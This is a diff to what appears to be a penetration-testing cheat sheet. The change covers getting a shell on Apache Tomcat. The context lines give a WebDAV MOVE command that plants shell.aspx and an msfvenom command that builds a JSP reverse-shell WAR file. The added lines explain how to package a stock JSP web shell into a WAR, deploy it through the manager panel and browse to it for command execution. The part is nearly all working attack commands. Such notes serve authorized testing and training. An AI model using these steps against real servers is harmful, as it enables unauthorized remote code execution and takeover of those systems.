@@ -362,6 +362,12 @@ curl -X MOVE -H "Destination:http://IP/shell.aspx" http://IP/shell.txt
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o rev.war
 # go to manager panel -> war file to deploy
 # click on the deployed war url for invoking reverse shell
+# Sometimes the tomcat application cannot execute msfvenom created payload
+# It can still be exploited by manually crafting a web shell payload
+cp /usr/share/webshells/jsp/cmdjsp.jsp ./cmd.jsp
+# Then manually create the war file
+jar -cvf rev.war cmd.jsp
+# Deploy and go to /rev/cmd.jsp in the browser, you should have a web shell there.
 ```
 
 ### ShellShock
